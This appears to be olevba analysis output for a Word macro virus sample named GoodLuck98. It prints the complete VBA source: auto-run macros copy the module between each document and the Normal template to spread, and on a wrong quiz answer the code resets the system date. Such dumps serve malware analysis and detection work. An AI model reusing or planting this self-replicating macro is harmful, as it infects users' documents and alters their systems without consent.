olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.GoodLuck-based-f3c1ed86aaebd3eba4e8a9eac9ef0924960bbe49
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.GoodLuck-based-f3c1ed86aaebd3eba4e8a9eac9ef0924960bbe49 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GoodLuck98.bas 
in file: Virus.MSWord.GoodLuck-based-f3c1ed86aaebd3eba4e8a9eac9ef0924960bbe49 - OLE stream: 'Macros/VBA/GoodLuck98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExit()
    
    Dim varResponse As Variant
    Dim intRandom As Integer
    Dim intV As Integer
    Dim intW As Integer
    Dim intX As Integer
    Dim intY As Integer
    Dim intA As Integer
    Dim intAnswer As Integer
    Dim intRandomAnswer As Integer
    Dim intYear As Integer
    Dim longOffset As Long
    
    On Error GoTo Error
    
    Randomize
    intRandomAnswer = Int((2 * Rnd) + 1)
    intA = Int((100 * Rnd) + 1)
    intV = Int((10000 * Rnd) + 1)
    intW = Int((10000 * Rnd) + 1)
    intX = Int((100 * Rnd) + 1)
    intY = Int((100 * Rnd) + 1)
    
    If intRandomAnswer = 1 Then
        intAnswer = intV + intW - intX * intY
    Else
        intAnswer = (intV + intW - intX * intY) + intA
    End If

    intRandom = Int((10 * Rnd) + 1)
    If intRandom = 1 Then
        varResponse = MsgBox(Trim(intV) + " + " + Trim(intW) + " - " + Trim(intX) + " * " + Trim(intY) + _
         " = " + Trim(intAnswer) + " ?", _
        vbYesNo, "Good Luck 98")
        
        If ((varResponse = vbYes) And (intRandomAnswer = 1)) Or ((varResponse = vbNo) And (intRandomAnswer = 2)) Then
            MsgBox "Congratulation, you have done a great job !", vbInformation, "Congratulation !"
        Else
            
            intYear = Year(Date)
            
            longOffset = ((intYear - 1980) * 365#) + Int((intYear - 1980) / 4)
            If (intYear >= 1980) And (intYear <= 2079) Then
                Date = #9/24/80# + longOffset
            Else
                Date = #9/24/98#
            End If
            MsgBox "Sorry, you are wrong !", vbExclamation, "Sorry !"
            MsgBox "Today (" + Trim(Date) + ") is my birthday.", vbInformation, "Happy Birthday !"
        End If
    End If
    Exit Sub
    
Error:
    MsgBox "Sorry, you are wrong !", vbExclamation, "Sorry !"
    
End Sub

Sub AutoClose()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="GoodLuck98", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoOpen()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="GoodLuck98", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoNew()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="GoodLuck98", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
+----------+--------------------+---------------------------------------------+

